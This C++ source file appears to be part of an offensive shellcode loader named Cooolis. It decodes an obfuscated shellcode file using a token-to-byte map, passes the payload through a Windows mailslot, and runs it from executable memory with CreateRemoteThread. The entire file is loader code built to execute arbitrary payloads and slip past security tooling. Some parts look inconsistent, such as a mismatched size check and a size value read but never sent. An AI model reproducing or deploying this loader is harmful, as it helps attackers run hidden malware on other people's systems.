#include "Cooolis-Shellcode.h"

CCooolisShellcode::CCooolisShellcode()
{
	for (INT i = 0; i < SHELLCODE_MAP_LEN; i++)
	{
		this->ShellcodeMap.insert(std::pair<std::string, BYTE>(SHELLCODE_MAP_STR[i], SHELLCODE_MAP_HEX[i]));
	}
}

CCooolisShellcode::~CCooolisShellcode()
{
	if(pFileMemory)
		HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, pFileMemory);
}

DWORD CCooolisShellcode::LoadeShellcodeFile(std::string filename)
{
	DWORD dwFileSize = 0;
	DWORD dwNumberToReaded = 0;
	HANDLE hFile = CreateFileA(filename.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return 0;
	}
	dwFileSize = GetFileSize(hFile, NULL);
	if (dwFileSize == 0)
		return 0;
	// std::cout << "[*] Shellcode FileSize : " << dwFileSize << " Bytes." << std::endl;
	this->pFileMemory = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize);
	if (!ReadFile(hFile, pFileMemory, dwFileSize, &dwNumberToReaded, NULL)) {
		return 0;
	}

	CloseHandle(hFile);

	return dwFileSize;
}

VOID CCooolisShellcode::ConvertShellcodeByCHAR(DWORD dwSize)
{
	this->dwShellcodeSize = dwSize/4;
	std::string sCodeString  = "";
	
	// this->Shellcode = new BYTE[dwShellcodeSize];
	this->Shellcode = (PBYTE)VirtualAlloc(NULL, dwShellcodeSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);

	for (INT x = 0, y = 1, z = 0; x < dwSize; x++)
	{

		sCodeString += this->pFileMemory[x];
		if (y == 4) {
			this->Shellcode[z] = this->ShellcodeMap[sCodeString];
			sCodeString.clear();
			y = 0;
			z++;
		}
		y++;
	}

	return VOID();
}

VOID CCooolisShellcode::CreateThreadRun()
{
	DWORD dwWritten = 0;
	DWORD dwOldProtect = NULL;
	DWORD dwMailSlotThreadId = 0;
	HANDLE hMailSlotThread = NULL, hMailSlot = NULL;
	VirtualProtect(this->Shellcode, this->dwShellcodeSize, PAGE_EXECUTE, &dwOldProtect);

	// 创建油槽线程
	hMailSlotThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)HandleMailSlot, NULL, NULL, &dwMailSlotThreadId);
	Sleep(1000);
	hMailSlot = CreateFile(
		SHELLCODE_MAILSLOTNAME, // 邮槽名称
		GENERIC_WRITE,      // 读写属性
		FILE_SHARE_READ,       // 共享属性
		NULL,                       // 安全属性
		OPEN_EXISTING,      // 打开方式
		FILE_ATTRIBUTE_NORMAL,      // 标志位
		NULL);                     // 文件模板（默认留空）
								   // 2. 向mailslot写入
	WriteFile(hMailSlot, this->Shellcode, this->dwShellcodeSize, &dwWritten, NULL);
	if (this->dwShellcodeSize != dwWritten) {
		return VOID();
	}
	CloseHandle(hMailSlot);
	WaitForSingleObject(hMailSlotThread, INFINITE);
	return VOID();
}

VOID CCooolisShellcode::HandleMailSlot()
{
	DWORD dwShellCodeSize = NULL;
	DWORD dwReadedSize = NULL;
	PBYTE bShellCode = NULL;
	HANDLE hThread = NULL;
	HANDLE hMailSlot = NULL;
	DWORD dwCount = 0, dwSize = 0;

	hMailSlot = CreateMailslot(
		SHELLCODE_MAILSLOTNAME,// 邮槽名
		0,					  // 无最大消息限制
		MAILSLOT_WAIT_FOREVER,// 永不超时
		NULL
	);
	if (hMailSlot == INVALID_HANDLE_VALUE) {
		return;
	}
	while (TRUE) {
		GetMailslotInfo(hMailSlot, NULL, &dwShellCodeSize, &dwCount, NULL);
		if (dwSize == MAILSLOT_NO_MESSAGE)
		{
			
			Sleep(1000);// 暂时没有消息
			continue;
		}
		while (dwCount)
		{
			ReadFile(hMailSlot, &dwShellCodeSize, sizeof(DWORD), &dwReadedSize, NULL);
			bShellCode = (PBYTE)VirtualAlloc(NULL, dwShellCodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
			ReadFile(hMailSlot, bShellCode, dwShellCodeSize, &dwReadedSize, NULL);
			hThread = CreateRemoteThread(GetCurrentProcess(), NULL, NULL, (LPTHREAD_START_ROUTINE)bShellCode, NULL, NULL, NULL);
			WaitForSingleObject(hThread, INFINITE);
			GetMailslotInfo(hMailSlot, 0, &dwSize, &dwCount, NULL);
			
		}
	}
	return;
}


